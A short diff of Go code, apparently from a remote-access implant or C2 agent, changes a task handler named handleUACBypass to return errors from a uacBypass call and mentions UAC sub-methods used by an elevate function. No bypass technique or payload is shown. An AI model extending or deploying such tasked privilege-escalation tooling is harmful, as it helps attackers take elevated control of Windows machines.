@@ -162,7 +162,12 @@ func handleUACBypass(task Task, res *TaskResult) {
 	if len(parts) > 1 {
 		payload = parts[1]
 	}
-	res.Output = uacBypass(method, payload)
+	out, err := uacBypass(method, payload)
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = out
 }
 
 // UAC sub-methods used by elevate()
